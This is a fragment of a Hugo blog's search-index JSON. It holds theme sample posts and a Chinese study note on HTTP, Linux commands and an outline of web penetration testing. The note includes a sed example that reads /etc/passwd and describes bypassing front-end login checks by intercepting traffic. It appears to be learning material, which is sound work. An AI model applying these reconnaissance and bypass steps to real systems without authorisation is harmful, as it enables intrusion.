nocturnal, and hunt for insects, worms, and other small creatures.\nHyperlinked image The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2019-03-11T00:00:00Z","image":"https://baoanleo.github.io/p/markdown-syntax-guide/pawel-czerwinski-8uZPynIu-rQ-unsplash_hu6307248181568134095.jpg","permalink":"https://baoanleo.github.io/p/markdown-syntax-guide/","title":"Markdown Syntax Guide"},{"content":"Lorem est tota propiore conpellat pectoribus de pectora summo.\nRedit teque digerit hominumque toris verebor lumina non cervice subde tollit usus habet Arctonque, furores quas nec ferunt. Quoque montibus nunc caluere tempus inhospita parcite confusaque translucet patri vestro qui optatis lumine cognoscere flos nubis! Fronde ipsamque patulos Dryopen deorum.\nExierant elisi ambit vivere dedere Duce pollice Eris modo Spargitque ferrea quos palude Rursus nulli murmur; hastile inridet ut ab gravi sententia! Nomine potitus silentia flumen, sustinet placuit petis in dilapsa erat sunt. Atria tractus malis.\nComas hunc haec pietate fetum procerum dixit Post torum vates letum Tiresia Flumen querellas Arcanaque montibus omnes Quidem et Vagus elidunt The Van de Graaf Canon\nMane refeci capiebant unda mulcebat Victa caducifer, malo vulnere contra dicere aurato, ludit regale, voca! Retorsit colit est profanae esse virescere furit nec; iaculi matertera et visa est, viribus. Divesque creatis, tecta novat collumque vulnus est, parvas. Faces illo pepulere tempus adest. Tendit flamma, ab opes virum sustinet, sidus sequendo urbis.\nIubar proles corpore raptos vero auctor imperium; sed et huic: manus caeli Lelegas tu lux. Verbis obstitit intus oblectamina fixis linguisque ausus sperare Echionides cornuaque tenent clausit possit. Omnia putatur. Praeteritae refert ausus; ferebant e primus lora nutat, vici quae mea ipse. Et iter nil spectatae vulnus haerentia iuste et exercebat, sui et.\nEurytus Hector, materna ipsumque ut Politen, nec, nate, ignari, vernum cohaesit sequitur. Vel mitis temploque vocatus, inque alis, oculos nomen non silvis corpore coniunx ne displicet illa. Crescunt non unus, vidit visa quantum inmiti flumina mortis facto sic: undique a alios vincula sunt iactata abdita! Suspenderat ego fuit tendit: luna, ante urbem Propoetides parte.\n","date":"2019-03-09T00:00:00Z","image":"https://baoanleo.github.io/p/placeholder-text/matt-le-SJSpo9hQf7s-unsplash_hu10664154974910995856.jpg","permalink":"https://baoanleo.github.io/p/placeholder-text/","title":"Placeholder Text"},{"content":"Mathematical notation in a Hugo project can be enabled by using third party JavaScript libraries.\nIn this example we will be using KaTeX\nCreate a partial under /layouts/partials/math.html Within this partial reference the Auto-render Extension or host these scripts locally. Include the partial in your templates like so: 1 2 3 {{ if or .Params.math .Site.Params.math }} {{ partial \u0026#34;math.html\u0026#34; . }} {{ end }} To enable KaTeX globally set the parameter math to true in a project\u0026rsquo;s configuration To enable KaTeX on a per page basis include the parameter math: true in content files Note: Use the online reference of Supported TeX Functions\nExamples Inline math: $\\varphi = \\dfrac{1+\\sqrt5}{2}= 1.6180339887…$\nBlock math: $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$","date":"2019-03-08T00:00:00Z","permalink":"https://baoanleo.github.io/p/math-typesetting/","title":"Math Typesetting"},{"content":"Emoji can be enabled in a Hugo project in a number of ways.\nThe emojify function can be called directly in templates or Inline Shortcodes.\nTo enable emoji globally, set enableEmoji to true in your site\u0026rsquo;s configuration and then you can type emoji shorthand codes directly in content files; e.g.\n🙈 :see_no_evil: 🙉 :hear_no_evil: 🙊 :speak_no_evil:\nThe Emoji cheat sheet is a useful reference for emoji shorthand codes.\nN.B. The above steps enable Unicode Standard emoji characters and sequences in Hugo, however the rendering of these glyphs depends on the browser and the platform. To style the emoji you can either use a third party emoji font or a font stack; e.g.\n1 2 3 .emoji { font-family: Apple Color Emoji, Segoe UI Emoji, NotoColorEmoji, Segoe UI Symbol, Android Emoji, EmojiSymbols; } ","date":"2019-03-05T00:00:00Z","image":"https://baoanleo.github.io/p/emoji-support/the-creative-exchange-d2zvqp3fpro-unsplash_hu5876398126655421130.jpg","permalink":"https://baoanleo.github.io/p/emoji-support/","title":"Emoji Support"},{"content":"title = \u0026lsquo;Newnewnew\u0026rsquo; date = 2024-09-17T17:46:38+08:00 draft = true\ntask0 http协议 HTTP协议（超文本传输协议）是用于在Web服务器和客户端之间传输超文本数据的协议。它是TCP/IP协议族的一部分，广泛应用于分布式、协作式和超媒体信息系统。HTTP基于请求/响应模式，是一种无状态协议，意味着每个请求/响应交换是独立的，服务器不会保存任何关于客户端之前请求的信息。在url请求的最前面就会有http协议，http也分为1.0，1.1，2.0。\n1.0是无连接，无状态的，无连接是每次请求都要建立连接，需要使用 keep-alive 参数建立长连接、http1.1默认长连接keep-alive，无法复用连接，每次发送请求都要进行TCP连接，TCP的连接释放都比较费事，会导致网络利用率低。\n1.1是无状态，长连接，所以是现在广泛使用的\n2.0是基于https的，它比1.1更加安全，http2.0会压缩头部header，例如如果同时多个请求其头部一样或相似，那么协议会消除重复部分\n状态码 HTTP状态码是服务器返回给客户端的3位数字代码，用于表示请求的结果。状态码分为五类：\n1xx - 信息性状态码：表示请求已接收、继续处理。\n2xx - 成功状态码：表示请求成功，例如200 OK。\n3xx - 重定向状态码：表示需要客户端采取进一步行动，例如301永久重定向。\n4xx - 客户端错误状态码：表示客户端的请求有误，例如404 Not Found。\n5xx - 服务器错误状态码：表示服务器无法处理请求，例如500 Internal Server Error。\n主要两种请求方式 主要分为get请求和post请求\nget请求 用于请求服务器发送资源，get意思是取，相当于从从服务器取得资源。多次发送GET请求不会改变资源的状态。 请求头中的主要字段包括：\nHost：指定请求的服务器的域名。 Accept：指定客户端能够接收的内容类型。 Content-Type：指定客户端发送的数据类型。 Cookie：存储在客户端的会话信息。\npost请求 用于向服务器提交数据。post意思是贴，相当于向服务器传送数据，POST请求通常用于创建或更新资源。 请求头中的主要字段包括：\nHost：指定请求的服务器的域名。 Accept：指定客户端能够接收的内容类型。 Content-Type：指定客户端发送的数据类型，如application/x-www-form-urlencoded。 Content-Length：指定请求体的长度。 Authorization：用于认证的凭证信息，比如token数据。\n各个请求头的含义 一个典型的HTTP请求报文由以下部分组成：\n请求行：包括方法（如GET、POST）、路径（如/workshop/api/mechanic/mechanic_report）和HTTP版本（如HTTP/1.1）。 请求头：包含各种元数据，如Host、Accept、Content-Type等。 空行：用于分隔请求头和请求体。 请求体：通常用于POST请求，携带要提交的数据，get请求的数据一般跟在路径后，比如/api/mechanic/mechanic_report?x=1这种。 常见请求头字段含义\nHost：指定请求的服务器的域名。 Accept：指定客户端能够接收的内容类型，如text/html、application/json。 Content-Type：指定客户端发送的数据类型，如application/x-www-form-urlencoded、application/json。 Content-Length：指定请求体的长度。 Authorization：提供认证信息，如Bearer token。 Cookie：用于发送会话信息，维持登录状态。 User-Agent：标识客户端软件的信息，服务器可以通过这个字段了解客户端的软件环境。 linux操作 文件，目录，软连接的操作\n创建文件：touch file.txt 创建目录：mkdir 目录名称 删除文件：rm file.txt 删除目录：rmdir 目录名称（需要目录为空） 移动文件或目录：mv file1 目录名称/ 或 mv 目录名称1 目录名称2 复制文件或目录：cp file1 file2 或 cp -r 目录名称1 目录名称2（递归复制） 查看文件内容：cat file.txt 查看目录内容：ls 查看文件权限：ls -l 修改文件权限：chmod 755 file.txt 分为文件所有者、用户组、其它用户，每一个都能拥有读写执行权(r,w,x),7代表给文件所有者的权限为4+2+1其中r为4，w为2，x为1，5为r为4，w为0，x为1。 修改文件所有者：chown user:group file.txt eg：1.chown newuser filename 将filename所有者权限改为newuser 2 chown newuser:newgroup filename 这个命令将文件将filename所有者改为newuser，且将组改为newgroup 创建软链接：ln -s /path/to/original /path/to/link 创建硬链接：ln /path/to/original /path/to/link 用户和权限管理\n添加用户：useradd username 删除用户：userdel username 修改用户密码：passwd username 查看用户列表：who 或 w 查看当前用户：whoami 切换用户：su - username 或 su username ** groupadd/groupdel/groupmod 用于管理用户组** 系统信息和监控\n查看系统信息：uname -a 查看系统负载：top 或 htop 查看进程列表：ps 或 pstree 查看网络流量：ifconfig 或 ip 查看磁盘使用情况：df -h 查看日志文件：journalctl 文本处理命令\nsed：用于流编辑，可以进行查找、替换、插入等操作。 eg：nl /etc/passwd | sed \u0026lsquo;2d\u0026rsquo; //删除第二行\n​ sed \u0026lsquo;2a drink tea\u0026rsquo; //在第二行下面追加一行\u0026quot;drink tea\u0026quot;，a代表append\n​ sed -n \u0026lsquo;5,7p\u0026rsquo;　//选取第5到7行输出，必须加-n参数，不然效果就是所有行都被输出，而5到7行输出两次。\n​ sed \u0026lsquo;2,5c No 25 lines\u0026rsquo;　//将第2到5行替换为一行字符串\u0026quot;No 25 lines\u0026quot;\nawk：用于模式扫描和处理语言，适用于处理文本和数据。 eg：awk \u0026lsquo;{print $1}\u0026rsquo; file.txt 此处\u0026rsquo;print’表示awk程序，而file.txt则为输入的文件名称。 grep：用于搜索文件中匹配特定模式的文本行。 eg：grep [option] pattern file\nSSH远程登录\n启动SSH客户端：ssh username@host 端口转发：ssh -L local_port:remote_host:remote_port username@host 密码less登录：ssh-keygen 生成密钥对，ssh-copy-id 将公钥复制到远程服务器 计划任务 使用cron：crontab -e 编辑crontab文件，设置定时任务。 对web的认知 Web渗透测试是一个专门研究如何发现和利用Web应用程序中的安全漏洞的领域。它涉及到对Web服务器、应用程序代码、数据库和整体网络环境的安全性评估。Web渗透测试的主要目的是为了发现可能被攻击者利用的漏洞，以便提前进行修复，确保Web系统的安全性。\n信息收集：通过黑暗搜索引擎、社交媒体等渠道收集目标网站的信息，包括网站组成、技术组成、人员信息等。 静态网页分析：对Web应用的HTML、CSS、JavaScript代码进行审查，寻找编码错误、敏感信息泄露等问题。 动态分析：通过与Web应用交互，模拟用户的行为，进行功能测试和漏洞探测。这可能包括SQL注入、XSS攻击、CSRF攻击等。 源码分析：如果是黑盒测试，也可以通过代码审计进行判断，如果不是黑盒也可以制造出黑盒来，比如通过前端中的一些信息可以找到搭建的框架的名称或者是网上有对应的源码，下载下来即可代码审计，如果是框架可以寻找网上的公开漏洞。 抓包分析：通过burpsuite，hiddler，charles等软件进行抓包，可以尝试对前端进行绕过，比如登录时若采取javascript语言进行验证，则可以通过抓包绕过验证，但是如果是后端用php语言进行验证则不能成功。 封包软件：通过封包整体测试触发事件数据包 编码问题：大多flag会由编码进行加密，我们需要用解密来将其提取出来，如base64编码特征是结尾通常有个=号 多站点：可能出现一个地址不同端口不同网站的问题，这个时候可以用黑暗引擎去扫描也可使用软件去探测。 网站扫描：在web渗透中，我们可以使用域名扫描去探测它们所有的域名，有些域名中就是关键。 漏洞扫描：使用自动化工具对Web应用进行安全扫描，识别已知的漏洞。 利用测试：对发现的漏洞进行实际利用，以验证漏洞的影响范围和严重程度。 ","date":"0001-01-01T00:00:00Z","permalink":"https://baoanleo.github.io/p/","title":""}]